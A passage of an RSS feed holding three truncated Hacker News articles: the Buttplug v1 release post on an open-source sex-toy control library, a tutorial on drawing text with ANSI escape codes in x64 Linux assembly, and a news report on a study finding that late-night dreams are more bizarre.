<p>Basically, there are <a href="https://iostindex.com/">hundreds of computer controlled sex toys out there</a>. Most of them have unique protocols to control them. Buttplug tries to centralize these control protocols, handles cross platform USB/Bluetooth/serial/etc for the developer, and presents a uniform way of controlling the whatever toy the user may have. Instead of knowing what operating system the user is on and how to talk to their specific toy, developers can use Buttplug to enumerate for a supported device, then send generic commands like “vibrate/rotate at [speed]”. That’s it.</p>



<p>While the sex toy control part of Buttplug is probably the most recognizable and memorable feature, it’s not the only goal of the project. Buttplug was established as an experiment for creating user-focused haptics and interface device abstraction. Libraries and engines like <a href="https://www.chai3d.org/">Chai3D</a> and <a href="https://h3dapi.org/">H3D</a> work as generalized haptics engines for studying mechanical systems, texture and force creation/simulation, while other systems like <a href="https://vrpn.github.io/">VRPN</a> work as a sort of user-space HID manager for systems that may not conform to general HID protocol boundaries. Buttplug seeks to take these two paradigms, and smoosh them together while also servicing a niche that doesn’t get much engineering attention. This leads to many interesting questions, like:</p>



<ul><li>How do we quickly and reliably bring up hardware communication across multiple platforms?</li><li>How do we interact with a user whose affective state may differ from someone using “normal” software like a word processor or database?</li><li>How do we create a language expressive enough to generate the experience a user wants, while also abstract enough to not be device specific?</li><li>What are the <a href="https://buttplug-developer-guide.docs.buttplug.io/intro/buttplug-ethics.html">ethical implications of building open source technology for intimacy</a>?</li><li>Can these questions be approached through technology in a way that is maintainable by a small, possibly one person team?</li></ul>



<p>We’ve heard from our community that some users are just interested in controlling sex toys, though, and that’s fine too. I guess.</p>



<p>If you’re curious about what users are doing with Buttplug, <a href="https://github.com/buttplugio/awesome-buttplug">check out our awesome-buttplug project list repo</a>.</p>



<h2>A Short-ish History of Buttplug</h2>



<p>Here’s an overview of the 16 year path from my start in sex tech to a v1 library for the field.</p>



<ul><li>2004<ul><li><a href="https://kyle.machul.is/">Kyle</a> starts <a href="https://metafetish.com/">Slashdong (which became Metafetish, now defunct)</a> to write about sex tech engineering.</li></ul></li><li>2007<ul><li><a href="https://youtu.be/FRLygav4tcs">Kyle gives a presentation at Arse Elektronika mentioning “Obfuscated Macros”</a>, which at the time seemed like a great name because Kyle was a 20-something engineer. This idea would grow to become the basis of Buttplug.</li></ul></li><li>2013<ul><li><a href="https://github.com/buttplugio/buttplug-py-deprecated">First Python implementation, known as “Fuck Everything”.</a> Uses ZeroMQ and Python 2. Never full shipped due to issues with python application redistribution, as well as lack of hardware on the market to support.</li></ul></li><li>Fall 2016<ul><li><a href="https://github.com/buttplugio/buttplug-rs">First Rust implementation.</a> Stalls due to lack of platform support for Bluetooth (most hardware we interact with is Bluetooth LE) and other hardware.</li></ul></li><li>April 2017<ul><li><a href="https://github.com/buttplugio/buttplug-csharp">First C# implementation, using the recently released UWP BTLE APIs for Windows.</a> Library gains momentum and project takes off, also establishing a <a href="https://buttplug-protocol-spec.docs.buttplug.io/">protocol spec</a> to ensure compatibility between versions.</li></ul></li><li>May 2017<ul><li><a href="https://github.com/buttplugio/buttplug-js">First JS implementation</a>, using WebBluetooth to access BTLE through the Chrome web browser. Later included native Node implementation using <a href="https://github.com/noble/noble">noble</a> and other hardware libraries.</li></ul></li><li>August 2017<ul><li>Kyle incorporates <a href="https://nonpolynomial.com/">Nonpolynomial</a></li></ul></li><li>December 2017<ul><li>Generic messages added to the Buttplug Protocol Spec, making it easier to command a wide range of devices. Due to maintenance timing and life in general, this is the last change to protocol spec for the next 3 years.</li></ul></li><li>April 2019<ul><li><a href="https://github.com/buttplugio/buttplug-py">Python implementation of Client API for Buttplug.</a> All hardware access was still managed via either JS or C# implementations.</li></ul></li><li>May 2019<ul><li>Established the <a href="https://intiface.com/">Intiface brand</a> for Buttplug applications developed by <a href="https://nonpolynomial.com/">Nonpolynomial</a>.</li></ul></li><li>Sept 2019<ul><li>Realize that maintaining 2 full implementations of Buttplug was untenable for a 1 person development team, work started on a new core implementation of Buttplug in (at that point unstable) async Rust, with other language implementations would then live on top of.</li></ul></li><li>January 2020<ul><li>Forked <a href="https://github.com/mwylde/rumble">Rumble</a> into <a href="https://github.com/deviceplug/btleplug">btleplug</a> (begrudgingly changing the name because rumble would’ve been GREAT to have in Buttplug but the original author was AWOL so package couldn’t be transfers on crates.io), brought up minimum BTLE capabilities in Windows, macOS, and Linux.</li></ul></li><li>October 2020<ul><li>Core async Rust Buttplug implementation hits feature parity with the C# and JS libraries. <a href="https://github.com/buttplugio/buttplug-rs-ffi">Move to porting C#/JS to using Rust via FFI</a>. C# calls into the native Rust library using exported C calls, while JS uses a WASM layer.</li></ul></li><li>December 2020<ul><li>v1 release, along with the first shipping of a new spec version since December 2017. FFI C#/JS libraries at parity with original native C#/JS libraries, original native libraries deprecated and archived. <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> in good enough shape to guide users on building simple Buttplug Applications. <a href="https://metafetish.com/">Metafetish</a> closes after 16 years in order to make way for new <a href="https://nonpolynomial.com/blog">Nonpolynomial blog</a>.</li></ul></li></ul>



<h2>What Buttplug Version 1 Means</h2>



<p>To me, a lot. To you, possibly not so much.</p>



<p>As mentioned, Buttplug Version 1 doesn’t really come with a lot of new features. It’s mostly a point where I can cut old stuff and start looking toward the future.</p>



<p><a href="https://github.com/buttplugio/buttplug-csharp">Buttplug C#</a> and <a href="https://github.com/buttplugio/buttplug-js">Buttplug JS</a> will now be archived, as implementations now live in our <a href="https://github.com/buttplugio/buttplug-rs-ffi">FFI repo</a>, and their respective <a href="https://www.nuget.org/packages/Buttplug/">nuget</a> and <a href="https://www.npmjs.com/package/buttplug">npm</a> packages will still live on as v1 and beyond. There will definitely be breaking changes between the v0.x and v1 versions for C#/JS, so if you’ve been developing on those, be ready. I did my best to keep the APIs similar, but also used this as a way to clean up some problems that had cropped up along the way.</p>



<p>Before v1, adding new features or hardware protocols meant implementing things in at least 2 places. Now, features can be implemented in Rust, then all that is required is a rebuild of the FFI and package version numbers being rolled. At worse, the FFI API surface may require changes, but that’s fairly trivial work versus having to redo full feature implementations. Most of the FFI work is up front in the initial implementation, and the hope is that continued maintenance will be much simpler. Time will tell whether this was a total mistake.</p>



<p>Success will be measured via this possible reduction of rote coding work. I’d like to spend more time on design with a flexible system versus having to re-implement my ideas multiple times to test them out across all platforms.</p>



<p>The Version 1 release will also probably be the only time that multiple libraries are released in lockstep with the same version number. I suspect that the FFI libraries will have API surface level issues that will require major version rolls outside of when the rust library updates. Everyone who has an affinity for version numbers, enjoy these stars aligning now, because it’s probably the last time it’ll happen.</p>



<h2>What’s Next</h2>



<p>There’s so many directions to go now that it’s almost hard to pick which to start with, but here’s some general ideas of what I’d like to do next:</p>



<ul><li>Blog Posts<ul><li>I have this shiny new blog now and I’d like to use it more. I have a lot of thoughts about Rust, WASM, and other technologies I’m using that I’d like to cover here.</li></ul></li><li>Documentation<ul><li>Buttplug v1 is documented just enough to maybe get people started, but the <a href="https://buttplug-developer-guide.docs.buttplug.io/">developer guide</a> and API documentation for the various implementations definitely need more love.</li></ul></li><li>More FFI Implementations<ul><li>Python is on the way soon, and C/C++ (especially for Unreal Engine suppot) and Java/Kotlin have been requested by the community.</li></ul></li><li>Application Updates<ul><li>I maintain a few applications, like <a href="https://intiface.com/desktop">Intiface Desktop</a> and the <a href="https://intiface.com/ghr">Game Haptics Router</a>, that have been backburnered while v1 was in progress. Would really like to get those updated and add some new features. Also need to update dependent libraries, like our <a href="https://github.com/buttplugio/buttplug-unity">Unity Game Engine</a> and <a href="https://github.com/buttplugio/buttplug-twine">Twine Game Engine</a> support.</li></ul></li><li>Hardware Support<ul><li>The v1 slog (this was supposed to be done in October, then <a href="https://www.supergiantgames.com/games/hades/">Hades</a> happened. Oops.) means hardware support for things like the <a href="https://patreon.com/tempestvr">OSR2</a> and <a href="https://github.com/buttplugio/buttplug-rs/issues/151">Nintendo Joycon</a> are still in development and running behind.</li></ul></li><li>Actually Making New Stuff<ul><li>Everything listed so far is continued maintenance. It’d be nice to actually make some new things too. Don’t know what those will be, but I need to actually create with my creation, instead of just creating my creation.</li></ul></li></ul>



<h2>Thanks</h2>



<p>Thanks go to:</p>



<ul><li>Loved ones and friends who’ve had to put up with me being “The Buttplug Guy” for the past 16 years (with no sign of that ending soon).</li><li>My <a href="https://patreon.com/qdot">Patreon</a> and <a href="https://github.com/sponsors/qdot">Github Sponsors</a> Subscribers, who’ve kept the project funded enough for me to buy new hardware.</li><li>My consulting clients for <a href="https://nonpolynomial.com/">Nonpolynomial</a>, who’ve helped keep the business cash positive while also helping my project along with support in their products.</li><li>Everyone who worked on reverse engineering toys and donating info to our <a href="https://stpihkal.docs.buttplug.io/">Sex Toys Protocols I Have Known And Loved (STPIHKAL) </a>documentation project.</li><li>Sex tech projects like <a href="https://iostindex.com/">IOSTI…</a></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/">https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</a></em></p>]]>
            </description>
            <link>https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561392</guid>
            <pubDate>Mon, 28 Dec 2020 18:01:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Having fun with ANSI codes and x64 Linux Assembly]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25561350">thread link</a>) | @guitmz
<br/>
December 28, 2020 | https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/ | <a href="https://web.archive.org/web/*/https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      
      

<h3 id="overview">Overview</h3>

<p>How can one not find command line art amusing? Specially when we are talking about computer viruses and even more so when referencing MS-DOS ones. The 16 bit era gave us some of the most interesting <a href="https://www.wired.com/2013/10/15-awesome-looking-viruses-from-the-ms-dos-era/">computer virus payloads</a> of all time, but achieving something like this today is not as <em>“trivial”</em> anymore.</p>

<p>As Linux is my OS of choice, I wanted to find something that could get close to these MS-DOS fun payloads for my own modern viruses, and, while it’s possible to <a href="http://seenaburns.com/2018/04/04/writing-to-the-framebuffer/">write directly to the framebuffer</a>, I wanted to try something related to terminal emulators instead. Enter <strong><em>ANSI escape sequences</em></strong>.</p>

<h3 id="how-it-works">How it works</h3>

<blockquote>
<p><em>ANSI escape sequences are a standard for <a href="https://en.wikipedia.org/wiki/In-band_signaling">in-band signaling</a> to control cursor location, color, font styling, and other options on video <a href="https://en.wikipedia.org/wiki/Text_terminal">text terminals</a> and <a href="https://en.wikipedia.org/wiki/Terminal_emulator">terminal emulators</a>. Certain sequences of <a href="https://en.wikipedia.org/wiki/Byte">bytes</a>, most starting with an <a href="https://en.wikipedia.org/wiki/Escape_character#ASCII_escape_character">ASCII Escape</a> and <a href="https://en.wikipedia.org/wiki/Bracket">bracket</a> character followed by parameters, are embedded into text. The terminal interprets these sequences as commands, rather than text to display verbatim.</em></p>

<p><em>ANSI sequences were introduced in the 1970s to replace vendor-specific sequences and became widespread in the computer equipment market by the early 1980s. They are used in development, scientific, commercial text-based applications as well as <a href="https://en.wikipedia.org/wiki/Bulletin_board_system">bulletin board systems</a> to offer standardized functionality.</em></p>

<p><em>Read more: <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">https://en.wikipedia.org/wiki/ANSI_escape_code</a></em></p>
</blockquote>

<p>Lots and lots of things you use daily are probably using ANSI escape codes, every time you see colored text on your terminal. Text-based user interfaces, a.k.a <a href="https://en.wikipedia.org/wiki/Text-based_user_interface">TUIs</a> need these control codes to <em>“draw”</em> what you see on your screen.</p>

<p><code>ESC</code> is represented by the well known <code>0x1b</code> <a href="https://en.wikipedia.org/wiki/C0_and_C1_control_codes#ESC">control byte</a> and the usage is as simple as using <code>printf</code> or <code>echo</code> to write the codes to <code>STDOUT</code> (keep in mind that the terminal you are using must support the ANSI sequences, look for <code>termcap</code> , <code>terminfo</code> and <code>infocmp</code> if you need).</p>

<p>There are some very good references for ANSI escape codes around the web, like the one at <a href="https://wiki.bash-hackers.org/scripting/terminalcodes">Bash Hackers Wiki</a>.</p>

<h3 id="code">Code</h3>

<p>While ANSI sequences are rather easy to use in any modern programming language, the same cannot be said for Assembly, mainly because the manual work involved when dealing with strings (I’m talking about pure Assembly, without including any external functions like <code>printf</code> and without invoking <a href="https://linux.die.net/man/1/tput">tput</a>).</p>

<p>Note that my code currently relies on <a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">ioctl</a> Linux system call to manipulate special files (like terminals) but <a href="https://man7.org/linux/man-pages/man3/termios.3.html">termios</a> would be a better approach here instead and I have kept <strong>ioctl</strong> because I wanted to re-use some old code snippet I wrote long time ago, before I knew about <strong>termios</strong>. I imagine it should be fairly easy to make the change if you want to and I plan to do it in the future.</p>

<p>From <a href="https://man7.org/linux/man-pages/man4/tty_ioctl.4.html">ioctl_tty</a> man page:</p>





<p>
  

Use of ioctl makes for nonportable programs.  Use the POSIX interface described in termios(3) whenever possible.


</p>



<p>A little helper program written in <code>C</code> like the one below can be used display the terminal dimensions (rows and columns) with <code>ioctl</code>:</p>

<div><pre><code data-lang="C"><span>#include</span> <span>&lt;sys/ioctl.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span> <span>main</span> <span>(</span><span>void</span><span>)</span> <span>{</span>
  <span>struct</span> <span>winsize</span> <span>ws</span><span>;</span>
  <span>ioctl</span> <span>(</span><span>STDIN_FILENO</span><span>,</span> <span>TIOCGWINSZ</span><span>,</span> <span>&amp;</span><span>ws</span><span>);</span>

  <span>printf</span> <span>(</span><span>"lines %d</span><span>\n</span><span>"</span><span>,</span> <span>ws</span><span>.</span><span>ws_row</span><span>);</span>
  <span>printf</span> <span>(</span><span>"columns %d</span><span>\n</span><span>"</span><span>,</span> <span>ws</span><span>.</span><span>ws_col</span><span>);</span>

  <span>return</span> <span>0</span><span>;</span>
<span>}</span></code></pre></div>

<p>Anyway, the example application I wrote will do the following:</p>

<ul>
<li>Save current terminal buffer (<code>ESC[?1049h</code>)</li>
<li>Clear screen (<code>ESC[2J</code>)</li>
<li>Invoke <code>ioctl</code> syscall to retrieve current window dimensions (rows and columns)</li>
<li>Use of the result from <code>ioctl</code> and perform some math to create a cursor, setting its rows and columns <code>(x, y)</code> position to more or less the center of the screen (<code>ESC[x;yH</code>)</li>
<li>Loop using <code>nanosleep</code> and <code>write</code> syscalls to simulate a <em>typewriter</em> effect while we write our message to the screen, byte by byte, including any extra ANSI sequences for formatting</li>
</ul>

<p>You can find the full commented source code with further instructions, all auxiliar functions and variable declarations on <a href="https://github.com/guitmz/ansi-escape">GitHub</a> but let’s go over the mentioned key steps above to understand it better.</p>

<ul>
<li>Saving current terminal buffer by writting <code>ESC[?1049h</code> (represented by <code>save_buffer</code>) to <code>STDOUT</code></li>
</ul>

<div><pre><code data-lang="nasm">    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>save_buffer</span><span>]</span>     <span>; loading rsi with ANSI code that saves current terminal buffer</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>save_buffer_size</span>  <span>; loading rdx with save ANSI code size</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>
    <span>syscall</span>                    <span>; saving current terminal</span></code></pre></div>

<ul>
<li>Clearing the screen by writting ESC[2J (represented by <code>clear_screen</code>) to <code>STDOUT</code></li>
</ul>

<div><pre><code data-lang="nasm">    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>cl</span><span>ear_screen</span><span>]</span>     <span>; loading rsi with ANSI code that clears screen</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>cl</span><span>ear_screen_size</span>  <span>; loading rdx with clear screen ANSI code size</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>
    <span>syscall</span>                     <span>; clearing the screen</span></code></pre></div>

<ul>
<li>Invoking <code>ioctl</code> syscall to retrieve terminal window size (this approach is not always guaranteed to give results and it’s safer to use it in conjunction to a lookup in the <code>termcap</code> database).</li>
</ul>

<div><pre><code data-lang="nasm">    <span>xor</span> <span>rdi</span><span>,</span> <span>rdi</span>         <span>; this means fd will be STDIN (same as "mov rdi, STDIN")</span>
    <span>mov</span> <span>rsi</span><span>,</span> <span>TIOCGWINSZ</span>  <span>; ioctl command to get window size</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>winsz</span>       <span>; winsz struct will contain terminal size information</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_IOCTL</span>
    <span>syscall</span>
    
    <span>call</span> <span>create_cursor</span>   <span>; creating ANSI code that moves to proper coordinates (result format: "ESC[x;yH")</span></code></pre></div><p>
​       It will populate <code>winsz</code> struct with the result values. More information on the <code>TIOCGWINSZ</code> command can be found <a href="http://www.delorie.com/djgpp/doc/libc/libc_495.html">here</a></p>

<div><pre><code data-lang="nasm"><span>struc</span><span>t</span> <span>WINSZ</span>
    <span>.ws_row</span>     <span>dw</span> <span>?</span>     <span>; rows, in characters</span>
    <span>.ws_col</span>     <span>dw</span> <span>?</span>     <span>; columns, in characters</span>
    <span>.ws_xpixel</span>  <span>dw</span> <span>?</span>     <span>; horizontal size, pixels</span>
    <span>.ws_ypixel</span>  <span>dw</span> <span>?</span>     <span>; vertical size, pixels</span>
<span>ends</span></code></pre></div>

<ul>
<li>Creating the initial cursor we will use as starting point to write our message. Basically we divide the screen rows and columns by <code>3</code> in order to get a nice centralized final output. Feel free to play around with this denominator for different results. The function below will construct the <code>ESC[x;yH</code> string into <code>cursor_buffer</code> and replace <code>x</code> and <code>y</code> with the result of our small division, rounding up if needed</li>
</ul>

<div><pre><code data-lang="nasm"><span>create_cursor:</span>
    <span>lea</span> <span>rdi</span><span>,</span> <span>[</span><span>cursor_buffer</span><span>]</span>   <span>; loading [cursor_buffer] into rdi</span>
    <span>mov</span> <span>byte</span> <span>[</span><span>rdi</span><span>],</span> <span>ES</span><span>C</span>        <span>; the 'ESC' character</span>
    <span>inc</span> <span>rdi</span>                    <span>; advance [cursor_buffer]</span>
    <span>mov</span> <span>byte</span> <span>[</span><span>rdi</span><span>],</span> <span>0x5b</span>       <span>; the '[' character</span>
    <span>inc</span> <span>rdi</span>                    <span>; advance [cursor_buffer]</span>

    <span>mov</span> <span>rcx</span><span>,</span> <span>3</span>                 <span>; loading denominator into rax</span>
    <span>mov</span> <span>r8w</span><span>,</span> <span>[</span><span>winsz.ws_row</span><span>]</span>    <span>; loading numerator (X axis = rows) into r8w</span>
    <span>call</span> <span>di</span><span>videRoundUp</span>         <span>; dividing r8w/rcx with result in rax</span>

    <span>cmp</span> <span>ax</span><span>,</span> <span>[</span><span>previous_axisX</span><span>]</span>   <span>; comparing X axis with previous X axis (zero during the first run)</span>
    <span>je</span> <span>.bad_axisX</span>              <span>; if current X axis = previous X axis, we should recalculate it</span>
    <span>jg</span> <span>.all_good</span>               <span>; else, we continue normally</span>
    <span>.bad_axisX:</span>                         
        <span>inc</span> <span>[</span><span>winsz.ws_row</span><span>]</span>     <span>; increasing current X axis as its the same as previous one (same cursor position not allowed)             </span>
        <span>jmp</span> <span>create_cursor</span>      <span>; recreating cursor ANSI escape code with proper coordinates</span>
    <span>.all_good:</span>
    <span>mov</span> <span>[</span><span>previous_axisX</span><span>],</span> <span>ax</span>   <span>; save X axis after dividing and rounding up into [previous_axisX]</span>

    <span>mov</span> <span>rdx</span><span>,</span> <span>rax</span>               <span>; loading X axis into rdx</span>
    <span>call</span> <span>convertStoreAxis</span>      <span>; converting X axis to ascii and storing in rdi (at current buffer position)</span>

    <span>mov</span> <span>byte</span> <span>[</span><span>rdi</span><span>],</span> <span>0x3b</span>       <span>; the ';' character </span>
    <span>inc</span> <span>rdi</span>                    <span>; advance [cursor_buffer]</span>

    <span>mov</span> <span>rcx</span><span>,</span> <span>3</span>                 <span>; loading denominator into rax</span>
    <span>mov</span> <span>r8w</span><span>,</span> <span>[</span><span>winsz.ws_col</span><span>]</span>    <span>; loading numerator (columns) into r8w</span>
    <span>call</span> <span>di</span><span>videRoundUp</span>         <span>; dividing r8w/rcx with result in rax</span>
    
    <span>mov</span> <span>rdx</span><span>,</span> <span>rax</span>               <span>; loading Y axis into rdx</span>
    <span>call</span> <span>convertStoreAxis</span>      <span>; converting Y axis to ascii and storing in rdi (at current buffer position)</span>

    <span>mov</span> <span>byte</span> <span>[</span><span>rdi</span><span>],</span> <span>0x48</span>       <span>; the 'H' character</span>

    <span>lea</span> <span>rdi</span><span>,</span> <span>[</span><span>cursor_buffer</span><span>]</span>   <span>; loading rdi with ANSI code that moves cursor ("ESC[x;yH")</span>
    <span>call</span> <span>strLen</span>                <span>; calculating code lenght from [cursor_buffer], result in rax</span>
    <span>ret</span></code></pre></div>

<ul>
<li>Now that we have the calculated <code>cursor_buffer</code>, we need to write it to <code>STDOUT</code>, which will move our cursor to the desired coordinates</li>
</ul>

<div><pre><code data-lang="nasm">    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>cursor_buffer</span><span>]</span>   <span>; loading rsi with ANSI code that moves cursor</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>rax</span>               <span>; loading rdx with proper code length (without trailing null character)</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>         <span>; in this program, the cursor will be set to the center of the screen</span>
    <span>syscall</span>                    <span>; moving cursor to (x, y)</span></code></pre></div>

<ul>
<li>What’s left now is to actually write our message to the screen, remember we are using <code>nanosleep</code> syscall to add some delay achieve a typewriter effect, so we will loop through our message byte by byte and write each byte to <code>STDOUT</code>. We also have to keep generating cursors with new <code>(x, y)</code> coordinates to move the input position around like a typewriter would (we can use <code>create_cursor</code> function again for that).</li>
</ul>

<div><pre><code data-lang="nasm"><span>struc</span><span>t</span> <span>TIMESPEC</span>
    <span>.tv_sec</span>     <span>dq</span> <span>0</span>            <span>; seconds to sleep</span>
    <span>.tv_nsec</span>    <span>dq</span> <span>060000000</span>    <span>; nanoseconds to sleep</span>
<span>ends</span></code></pre></div>

<div><pre><code data-lang="nasm"><span>.outputLoop:</span>
    <span>push</span> <span>rcx</span>                     <span>; saving msg_size in stack because syscall overwrites it</span>

    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>msg</span> <span>+</span> <span>rbx</span><span>]</span>         <span>; loading rsi with msg[rbx] character</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>1</span>                   <span>; length (rdx) is 1 since we are outputting a single byte at a time</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>
    <span>syscall</span>                      <span>; prints msg[rbx] to STDOUT</span>

    <span>cmp</span> <span>byte</span> <span>[</span><span>rsi</span><span>],</span> <span>0xa</span>          <span>; checking if current character is new line (\n)</span>
    <span>jne</span> <span>.continue</span>                <span>; if not, skip .moveCursor and continue</span>
    <span>.moveCursor:</span>
        <span>inc</span> <span>[</span><span>winsz.ws_row</span><span>]</span>       <span>; incrementing X axis to account for new line</span>
        <span>call</span> <span>create_cursor</span>       <span>; creating new ANSI code to move cursor to new coordinates</span>

        <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>cursor_buffer</span><span>]</span> <span>; loading rsi with ANSI code that moves cursor</span>
        <span>mov</span> <span>rdx</span><span>,</span> <span>rax</span>             <span>; loading rdx with proper code length (without trailing null character)</span>
        <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
        <span>mov</span> <span>r…</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/">https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/</a></em></p>]]>
            </description>
            <link>https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561350</guid>
            <pubDate>Mon, 28 Dec 2020 17:55:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Study: The later it is at night, the more likely we are to have weird dreams]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25561331">thread link</a>) | @Bologo
<br/>
December 28, 2020 | https://www.psychnewsdaily.com/study-finds-that-we-have-more-weird-dreams-as-the-night-progresses/ | <a href="https://web.archive.org/web/*/https://www.psychnewsdaily.com/study-finds-that-we-have-more-weird-dreams-as-the-night-progresses/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5816" role="main">
<div>
<div>
<div>
<p>A <a href="https://www.sciencedirect.com/science/article/pii/S1053810020305389" target="_blank" rel="noreferrer noopener">new study</a> has found that the later it is, the more likely people are to have weird dreams.<span data-ez-name="psychnewsdaily_com-medrectangle-3"></span></p>
<p>The study adds to the <a href="https://amzn.to/2Kx7WKB" target="_blank" rel="noreferrer noopener">growing body of academic research on dreams</a>, a burgeoning field also known as <a href="https://en.wikipedia.org/wiki/Oneirology" target="_blank" rel="noreferrer noopener">oneirology</a>.</p>
<p>The study appeared on December 25 in the journal <em><a href="https://www.journals.elsevier.com/consciousness-and-cognition/" target="_blank" rel="noreferrer noopener">Consciousness and Cognition</a></em>. It was based on 68 students (58 of whom were female) at two universities in the United Kingdom. Their average age was 25. </p>
<h2>From crazy dreams to creepy dreams, and everything in between</h2>
<p>On two non-consecutive nights, a pre-programmed alarm clock woke the participants up four times throughout the night, at two-hour intervals. Upon each waking, they spoke into a digital audio device to record the contents any dream they might have been having. </p>
<p>The next morning, they listened to their recordings and completed a form that contained questions about each dream. The questions asked, for example, how bizarre the dream was on a scale of one to nine, how intense it was, how related the dream was to the dreamer’s waking life (past, present, or future), what emotions it conjured up, etc.<span data-ez-name="psychnewsdaily_com-medrectangle-4"></span></p>
<p>The average number of dreams that each participant recorded across the eight “awakenings” was about five.</p>
<p>The researchers, Josie Malinowski and Caroline Horton, grouped these dreams into two categories. The first consisted of “early night” dreams, consisting of dreams recorded after the two-hour and four-hour awakenings (in other words, dreams that took place during the first four hours of sleep). The second category consisted of “late night” dreams, recorded after the six-hour and eight-hour awakenings (i.e., during the second four hours of sleep). This categorization resulted in 173 early-night dreams and 177 late-night dreams.</p>
<h2>The wee hours are rife with weird dreams</h2>
<p>The results showed that late-night dreams were rated as substantially more bizarre and more metaphorical than early-night dreams. The participants also considered their late-night dreams more emotional, more intense, and more “important” than early-night dreams. Likewise, the late-night dreams were more likely to involve the distant past.</p>
<p>In contrast, the participants reported that their early-night dreams were more related to their waking life than the late-night dreams. The researchers found no differences between late-night and early-night dreams in terms of their stressfulness or negative valence.<span data-ez-name="psychnewsdaily_com-box-4"></span></p>
<p>The study also included several examples that the researchers say typify the early-night or late-night dreams of this sample group. One early-night dream, for example, was about the dreamer going on a shopping spree in a mall. In contrast, a typical late-night dream involved an exam session that morphed into a party with the party-goers clad in Victorian clothes, and where time itself was dancing.</p>
<h2>Bizarre dream images, new dream theories</h2>
<p>The fact that “dream-like” cognition increases in step with the amount of time spent asleep reflects “the change towards fluid, creative, and hyperassociative cognitive processes that underlie sleep towards the latter part of the night,” the researchers write.</p>
<p>And these differences in dream content may also relate to different sleep-related processes. The activation of memories during sleep, for example, <a href="https://www.frontiersin.org/articles/10.3389/fpsyg.2015.00874/full" target="_blank" rel="noreferrer noopener">probably has to do with memory consolidation</a>. Knowing more about how dream content changes over the course of the night “can provide insights into the nature of these processes of memory activation,” the authors write.</p>
<p>“Taken together, the increase in bizarreness, metaphoricity, and time orientation variance of late-night dreams show several ways in which late-night sleep cognition tends to be more fluid, creative, and associative than early-night dreams,” the study proposes.</p>
<p>Of course, this study reflects the dreams of a relatively small group of mostly young women based at British universities. As such, a broader sample pool might lead to different findings.</p>
<h2>“I have such funny dreams…” </h2>
<p>Likewise, the study is based entirely on the participants’ self-reports, in line with other <a href="https://www.psychnewsdaily.com/how-sharing-your-dreams-could-help-to-improve-your-relationships/" target="_blank" rel="noreferrer noopener">dream research</a>. But the researchers maintain that self-rating is the most appropriate method for determining the “bizarreness” of a dream. That is <a href="https://www.semanticscholar.org/paper/The-Problem-of-Dream-Content-Analysis-Validity-as-a-Schredl/34a69af866262c4514ecddf2ca2a72c5b6c451c2" target="_blank" rel="noreferrer noopener">because past research has found</a> that “external raters underestimate the amount of bizarreness in a dream in comparison to dreamers’ own ratings.” This finding can be confirmed by anyone who has ever listened to a description of someone else’s ostensibly weird dreams.</p>
<p>But the fact that someone describes a given dream as weird is fully understandable. The “intense (hyper)connectivity” of some dreams, the study writes, “may bring together memories, thoughts, and experiences from seemingly unrelated components of the dreamer’s life.”</p>
<p>The authors suggest future research could investigate whether people with more bizarre dreams also score higher on creativity measurements.</p>
<hr>
